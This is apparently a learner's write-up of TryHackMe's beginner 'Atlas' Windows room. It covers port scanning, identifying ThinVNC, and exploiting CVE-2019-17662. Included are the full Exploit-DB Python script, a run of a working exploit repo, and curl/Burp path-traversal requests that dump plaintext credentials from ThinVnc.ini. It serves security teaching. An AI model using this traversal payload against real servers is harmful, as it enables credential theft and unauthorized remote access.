---
Hack the Atlas server in this beginner room covering Windows attack methodology!
---

# Atlas — Writeup

## Overview
### Atlas — Writeup
### Atlas — Writeup
![](https://assets.muirlandoracle.co.uk/thm/rooms/atlas/atlas-header.png)
![](https://tryhackme-images.s3.amazonaws.com/room-icons/4230419258baf63102a2e1fbe8e5e491.jpeg)
Start Machine
Welcome to Atlas!
This is an introductory level room which aims to teach you the very basics of Windows system exploitation, from initial access, through to privilege escalation. You do not need any prior experience before attempting this room; however, it would help to have an understanding of [basic Linux usage](https://tryhackme.com/module/linux-fundamentals) and various other fundamental topics. Resources for these topics are linked at appropriate places in the room for extra reading.
You will find that a lot of this room is completely guided; however, there are places where the instructions are slightly more vague. These places are designed to help you develop the research mindset which is all-important in hacking.
Answer the questions below
Press the Green "Start Machine" button to deploy the machine!
_**Note:** It may take up to three minutes for this machine to fully boot._

## Enumeration
The key to hacking is information.
Contrary to what you may see in films and pop culture, hacking is not (usually) a matter of sitting in a darkened room and sending streams of green text cascading down a terminal window. Rather, it involves careful enumeration to find leverage-able mistakes in configurations or code and using them to force a system to do something that it is not supposed to do. For example, you may find that a web application fails to properly sanitise user input, resulting in you (as a white-hat hacker) being able to inject unwanted data into the database serving the site.
The _only_ way to find these vulnerabilities is to patiently enumerate the attack surface. The more you know about your target(s), the better placed you will be to find and exploit vulnerabilities whilst evading any protective measures in place around the system.
---
This room will be very simple, but that doesn't mean we can get away without enumeration.
Once we know our target (in this case we have one target with an IPv4 address of `MACHINE_IP`), the first thing we nearly always do is perform a _port scan._ As a brief summary: every computer with network capabilities has 65535 available _ports_. Each of these can have a different service bound to it. For example, a single server may host web services on ports 80 and 443, an SMTP mail server on port 25, and a proxy on port 8080. The first 1024 ports are considered "well-known" and are assigned to services by convention. For example, a web server will nearly always use port 80 for HTTP and port 443 for HTTPS connections; this means that your web browser knows what port to look at automatically, which is why you don't have to specify the port when navigating to a website.
_**Note:** We won't cover the differences between the TCP and UDP protocols in this room. I__f you are interested, please read the information [here](https://tryhackme.com/room/packetsframes). If you are already familiar with these protocols, assume that all referenced ports are TCP ports in this room._
The fact that a single server can host multiple services means that we need ascertain what the target is exposing to us over the network before we can attempt to exploit anything: cue, port scans.
Port scanning effectively attempts to connect to specified ports on the target and checks the responses from the server to see if each targeted port is open, closed, or protected by a firewall. The most common tool for port scanning is a Command Line tool called [Nmap](https://nmap.org/) -- it will be installed by default on any penetration testing distribution, including the AttackBox.
At its most basic, the syntax for Nmap is quite simply `nmap IP_ADDRESS`
For example, scanning the always-running `10.10.10.10` box on the TryHackMe network gives us the following output:
Nmap Basic Syntax
```shell-session
pentester@attacker:~$ nmap 10.10.10.10
Starting Nmap 7.91 ( https://nmap.org )
Nmap scan report for 10.10.10.10
Host is up (0.032s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
```
This is useful, but it doesn't quite give us everything we want. For example, we may wish to scan more than the default 1000 ports; we may want more information about the target, or to perform service detection. For these purposes we use _switches_.
Switches are command line arguments that alter the functionality of a tool. Nmap has hundreds of available switches (or flags, to give them another name). For example, we could use `-vv` to increase the verbosity of the output Nmap provides; in context, the full command would look like this: `nmap -vv IP_ADDRESS`.
Here is a useful (but far from comprehensive) list of switches:
**Switch**
**Does**
`-vv`
Set verbosity level to two
`-Pn`
Don't bother assessing whether the machine is active -- just scan it._
**This is very useful for Windows machines** where ICMP echo (ping) packets are blocked by default on public networks._
`-p PORT,PORT`
Specify ports to scan, e.g. `-p 80,443`
This list will do for the time being, but please check out the [Nmap room](https://tryhackme.com/room/furthernmap) for a more thorough explanation of the tool if you haven't already done so.
Answer the questions below
Scan your target IP (`MACHINE_IP`) with Nmap!
_**Note:** you will need the_ `-Pn` _switch here. A complete command can be found in the hint._
```text
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.92.200 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.92.200:3389
Open 10.10.92.200:7680
Open 10.10.92.200:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.92.200 [3 ports]
Discovered open port 8080/tcp on 10.10.92.200
Discovered open port 3389/tcp on 10.10.92.200
Discovered open port 7680/tcp on 10.10.92.200
Completed Connect Scan (3 total ports)
Initiating Service scan
Scanning 3 services on 10.10.92.200
Completed Service scan (3 services on 1 host)
NSE: Script scanning 10.10.92.200.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.92.200
Host is up, received user-set (0.30s latency).

PORT     STATE SERVICE       REASON  VERSION
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| ssl-cert: Subject: commonName=GAIA
| Issuer: commonName=GAIA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| MD5:   f11d67ae6db16ace9ffc8516cb23bf2c
| SHA-1: bb11b8cdffc250fe9b53ca5b61e10938b917ca9b
| -----BEGIN CERTIFICATE-----
| MIICzDCCAbSgAwIBAgIQF7xYiGQMsbVKR1jFy7Zl3TANBgkqhkiG9w0BAQsFADAP
| MQ0wCwYDVQQDEwRHQUlBMB4XDTIzMDEwMTAxNDgxNVoXDTIzMDcwMzAxNDgxNVow
| DzENMAsGA1UEAxMER0FJQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| ALNmY6GXm1p/ire4NxnkvvaGnmXlvvFmnamAlrG1j3c42B7TMJeiszMoS3Rv23XL
| lB4Ld6x3oyk5CV3D7rsy6tXu2sCBMhezkupd/emUjgMwzbLk9eXxrM8j089R4g5I
| j6tA68CjD7PDESNZasLsYDTnY/y8b9OP0xNVxea80gvGY6ZMLHV9bZDCLyolmXk+
| MmTtkHcEnxcY/y747CU5OJ07p5j4XUPj1NlzF1Y4fRDBoepesGZ+9wfpO7+Be/9N
| 642rHC50DCegkXPUTzQkXedr0Zlyj4gDao1DS3lbaCmlRaneUryw20vvuP3e88dA
| Vl82IWKJk4vrYVNfICRuqSkCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEw
| CwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQBlqnhbBEf6eaeT/I3/XIqZ
| o6sQfZsfb4ZtQMTC7rrnvMIYbY42PxUnN2yKWWD2ylhcH1hduT/+im1iYB4fJ+TZ
| WLigY7SBUsi4Y7HaCBYnsve51zGBv8xVJarFiXcy77efYbcvVS3MRzux15qJeDUB
| fkg66W7mqgKGmOV72BI1huFAC6i0rdoaGKnuv9dsofERXGYkyWOago5RVA7CQ/rq
| Qm6ajoL8bJD5VUhBCqxD5+GiF8ErPDLnUbFt3Z+FlIkWzvtIm/s7Yoegd5xPdkxa
| 4Gl0mYNnKxaGBvOJl/UJEE0W2ljfuTeM+pV/LqkN7Fw0itH6n/wucblWDLrBJcdk
|_-----END CERTIFICATE-----
7680/tcp open  pando-pub?    syn-ack
8080/tcp open  http-proxy    syn-ack
| http-auth: 
| HTTP/1.1 401 Access Denied\x0D
|_  Digest opaque=bB3d9A7bT5TmIf3wu9NgCKZ7SPAHFCtRVB qop=auth nonce=e/H2fgLw5UCo6ToCAvDlQA== realm=ThinVNC
| http-methods: 
|_  Supported Methods: GET POST
|_http-favicon: Unknown favicon MD5: CEE00174E844FDFEB7F56192E6EC9F5D
|_http-title: 401 Access Denied
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Type: text/html
|     Content-Length: 177
|     Connection: Keep-Alive
|     <HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>404 Not Found</H1>The requested URL nice%20ports%2C/Tri%6Eity.txt%2ebak was not found on this server.<P></BODY></HTML>
|   GetRequest: 
|     HTTP/1.1 401 Access Denied
|     Content-Type: text/html
|     Content-Length: 144
|     Connection: Keep-Alive
|     WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="bZbzdALw5UDo1zoCAvDlQA==", opaque="V6a1oEg7moyejTQ88ouyxoKEiqALtyV4oP"
|_    <HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL requires authorization.<P></BODY></HTML>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=1/1%Time=63B2386E%P=x86_64-pc-linux-gnu%r(Get
SF:Request,179,"HTTP/1\.1\x20401\x20Access\x20Denied\r\nContent-Type:\x20t
SF:ext/html\r\nContent-Length:\x20144\r\nConnection:\x20Keep-Alive\r\nWWW-
SF:Authenticate:\x20Digest\x20realm=\"ThinVNC\",\x20qop=\"auth\",\x20nonce
SF:=\"bZbzdALw5UDo1zoCAvDlQA==\",\x20opaque=\"V6a1oEg7moyejTQ88ouyxoKEiqAL
SF:tyV4oP\"\r\n\r\n<HTML><HEAD><TITLE>401\x20Access\x20Denied</TITLE></HEA
SF:D><BODY><H1>401\x20Access\x20Denied</H1>The\x20requested\x20URL\x20\x20
SF:requires\x20authorization\.<P></BODY></HTML>\r\n")%r(FourOhFourRequest,
SF:111,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Type:\x20text/html\r\n
SF:Content-Length:\x20177\r\nConnection:\x20Keep-Alive\r\n\r\n<HTML><HEAD>
SF:<TITLE>404\x20Not\x20Found</TITLE></HEAD><BODY><H1>404\x20Not\x20Found<
SF:/H1>The\x20requested\x20URL\x20nice%20ports%2C/Tri%6Eity\.txt%2ebak\x20
SF:was\x20not\x20found\x20on\x20this\x20server\.<P></BODY></HTML>\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.75 seconds
```
With the Nmap default port range, you should find that two ports are open. What port numbers are these?
Submit the answer as a comma-separated list from low to high, e.g. `80,443`.
*3389,8080*
What service does Nmap think is running on the higher of the two ports?
*http-proxy*
We would usually go on to do a lot more in-depth scanning, but we will leave it at that for this introductory room. We have what we need for the time being.
Completed
In the previous task we discovered two services -- now it's time to see what we can do with them!
The first service we found was on port 3389. This is traditionally Microsoft's **R**emote **D**esktop **P**rotocol (RDP), which is used to get a graphic remote desktop session on the remote machine. We can verify whether this _is_ RDP with an Nmap service scan:
Service Scan Results
```html

```
Here the "Microsoft Terminal Services" tells us that this is indeed RDP. Knowing that this exists is beneficial as it potentially gives us a stable way to access the box later on; however, there are no recent vulnerabilities in the Microsoft implementation of RDP, so this isn't hugely useful to us at this moment in time.
---
Let's move on and have a look at the other service we found; this is more interesting. Port 8080 doesn't have an _official_ designation, but it is often used for alternative HTTP services; for example, HTTP proxies frequently use it -- as Nmap (incorrectly) identified this service as.
Nmap is unable to get an accurate reading on the service here, which makes it all the more interesting. What happens when we try to access it in a web browser?
We get an request for authentication; this could have gone better, but it _does_ tell us one very important thing: we are _definitely_  dealing with a web server of some kind.
Whilst newer versions of Firefox don't seem to show it, these HTTP Basic Authentication credential boxes usually come with a message from the server -- if we can get a look at that message then we might get a clue as to what is running on this port!
[cURL](https://curl.se/) is a command-line tool which lets us make (and craft) requests over various protocols -- most commonly HTTP(S).
Let's use it here to take a look at the headers the server is sending us when we connect to the port:
cURL request
```html

```
We have a variety of sections in this request -- all have been highlighted.
-   In yellow we have the _request_ headers -- these are what we _sent_ to the server. We aren't interested in these just now.
-   In green we have the _response_ headers -- these are what the server sent to _us_ in response. This contains something interesting.
-   In cyan we have the response _body_ telling us that we aren't allowed to access the site unless we supply some credentials.
In red we have what we were looking for. "ThinVNC" is the name of a web-based **V**irtual **N**etwork **C**omputing (VNC) server. Like RDP, VNC allows us to access a device remotely; however, this server allows us to access to device from our web browser rather than requiring a separate client to connect. As a side note, if you are using the AttackBox in your browser right now then you are also connected to it using VNC.
A little research informs us that the latest release of ThinVNC is very old -- this vastly increases the chances of it being vulnerable to _something._ Let's open a terminal and use a tool called `searchsploit` to look for vulnerabilities for the software (querying the [Exploit-DB](https://exploit-db.com/) database):
Searchsploit Results
```shell-session
pentester@attacker:~$ searchsploit thinvnc
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
ThinVNC 1.0b1 - Authentication Bypass         | windows/remote/47519.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Bingo!
Answer the questions below
Use searchsploit to find the vulnerability in ThinVNC
```text
──(kali㉿kali)-[~]
└─$ curl http://10.10.92.200:8080 -v  
*   Trying 10.10.92.200:8080...
* Connected to 10.10.92.200 (10.10.92.200) port 8080 (#0)
> GET / HTTP/1.1
> Host: 10.10.92.200:8080
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Access Denied
< Content-Type: text/html
< Content-Length: 144
< Connection: Keep-Alive
< WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="tr1noALw5UBI2ToCAvDlQA==", opaque="HGrkYh3xcZmYeJZ0d5UOivu6RorlmCo5dh"
< 
<HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL  requires authorization.<P></BODY></HTML>
* Connection #0 to host 10.10.92.200 left intact
```
```text
┌──(kali㉿kali)-[~]
└─$ searchsploit ThinVNC                                                                          
---------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                              |  Path
---------------------------------------------------------------------------- ---------------------------------
ThinVNC 1.0b1 - Authentication Bypass                                       | windows/remote/47519.py
---------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
```text
┌──(kali㉿kali)-[~]
└─$ searchsploit -m windows/remote/47519.py
  Exploit: ThinVNC 1.0b1 - Authentication Bypass
      URL: https://www.exploit-db.com/exploits/47519
     Path: /usr/share/exploitdb/exploits/windows/remote/47519.py
    Codes: CVE-2019-17662
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/47519.py
```
```text
┌──(kali㉿kali)-[~]
└─$ cat 47519.py
```
```text
# Exploit Title: ThinVNC 1.0b1 - Authentication Bypass
```
```text
# Date: 2019-10-17
```
```text
# Exploit Author: Nikhith Tumamlapalli
```
```text
# Contributor WarMarX
```
```text
# Vendor Homepage: https://sourceforge.net/projects/thinvnc/
```
```text
# Software Link: https://sourceforge.net/projects/thinvnc/files/ThinVNC_1.0b1/ThinVNC_1.0b1.zip/download
```
```text
# Version: 1.0b1
```
```text
# Tested on: Windows All Platforms
```
```text
# CVE : CVE-2019-17662
```
```text
# Description:
```
```text
# Authentication Bypass via Arbitrary File Read

#!/usr/bin/python3

import sys
import os
import requests

def exploit(host,port):
    url = "http://" + host +":"+port+"/xyz/../../ThinVnc.ini"
    r = requests.get(url)
    body = r.text
    print(body.splitlines()[2])
    print(body.splitlines()[3])

def main():
    if(len(sys.argv)!=3):
        print("Usage:\n{} <host> <port>\n".format(sys.argv[0]))
        print("Example:\n{} 192.168.0.10 5888")
    else:
        port = sys.argv[2]
        host = sys.argv[1]
        exploit(host,port)

if __name__ == '__main__':
    main()
```

## Exploitation
At this point we would usually copy the exploit, read through it carefully (very important!) then deploy it against the target when we are satisfied that it only does what it claims to do.
In this case the exploit in Exploit-DB doesn't actually work, but it does give us an idea of what we're dealing with. The short version is:
The latest version of ThinVNC (at the time of writing) contains a path traversal vulnerability which effectively allows us to read any file on the target. Combine this with the fact that ThinVNC (stupidly) stores its access credentials in plaintext (i.e. completely unsecured), we can read the file containing the credentials and bypass the authentication!
For the sake of keeping things very simple, we are going to use a working copy of the exploit to access the credentials.
Answer the questions below
_Clone_ the Git repository at [https://github.com/MuirlandOracle/CVE-2019-17662](https://github.com/MuirlandOracle/CVE-2019-17662)  to your attacking machine.
See if you can figure out how to do this in your terminal by yourself, otherwise, the command is given in the hint.
git clone https://github.com/MuirlandOracle/CVE-2019-17662
Completed
Hint
Switch into the newly created exploit directory and set the file to be executable (`chmod +x CVE-2019-17662.py`) -- this may already be done for you, but better safe than sorry!
Try executing the exploit -- you should see a help menu
Making the Exploit Executable
```shell-session
pentester@attacker:~$ cd CVE-2019-17662/
pentester@attacker:~/CVE-2019-17662$ chmod +x CVE-2019-17662.py 
pentester@attacker:~/CVE-2019-17662$ ./CVE-2019-17662.py 
usage: CVE-2019-17662.py [-h] [-f FILE] [-s] [--accessible] host port
CVE-2019-17662.py: error: the following arguments are required: host, port
```
Completed
Read through the exploit help menu
This script _requires_ two arguments. Ascertain what these arguments are, then use the script to exploit the vulnerable service on the target.
Completed
Use the credentials found by the script to get past the HTTP Basic Auth presented when trying to access the vulnerable service in your web browser. You should have access to a user desktop!
Completed
**[Bonus Question -- Optional]** Read through the exploit code and try to perform the exploit manually using cURL or Burp Suite. You may need to look into _path normalisation_ for error debugging.
Completed
```text
┌──(kali㉿kali)-[~/CVE-2019-17662]
└─$ python3 CVE-2019-17662.py 10.10.92.200 8080

     _____ _     _    __     ___   _  ____                                                                    
    |_   _| |__ (_)_ _\ \   / / \ | |/ ___|                                                                   
      | | | '_ \| | '_ \ \ / /|  \| | |                                                                       
      | | | | | | | | | \ V / | |\  | |___                                                                    
      |_| |_| |_|_|_| |_|\_/  |_| \_|\____|                                                                   
                                                                                                              
                            @MuirlandOracle                                                                   

                
[+] Credentials Found!
Username:       Atlas
Password:       H0ldUpTheHe@vens

using burpsuite

https://redteamzone.com/ThinVNC/

GET /admin/../../ThinVnc.ini HTTP/1.1

HTTP/1.1 200

Content-Type: application/binary

Content-Length: 149

Connection: Keep-Alive

[Authentication]

Unicode=0

User=Atlas

Password=H0ldUpTheHe@vens

Type=Digest

[Http]

Port=8080

Enabled=1

[Tcp]

Port=

[General]

AutoStart=1

https://www.youtube.com/watch?v=whqiiNXZlIk&ab_channel=%C4%A2%C4%93%C5%A6%C4%90%C5%97%C4%A9%C9%A4%C9%98
```
```text
┌──(kali㉿kali)-[~/CVE-2019-17662]
└─$ curl -XGET "http://10.10.196.63:8080/witty/\../\../ThinVnc.ini" 

[Authentication]
Unicode=0
User=Atlas
Password=H0ldUpTheHe@vens
Type=Digest
[Http]
Port=8080
Enabled=1
[Tcp]
Port=
[General]
AutoStart=1

yep I did it, using burpsuite and curl :)
```
![[Pasted image 20230101223920.png]]
![[Pasted image 20230101223935.png]]
![[Pasted image 20230101224137.png]]
### Access VNC 🠖 RDP
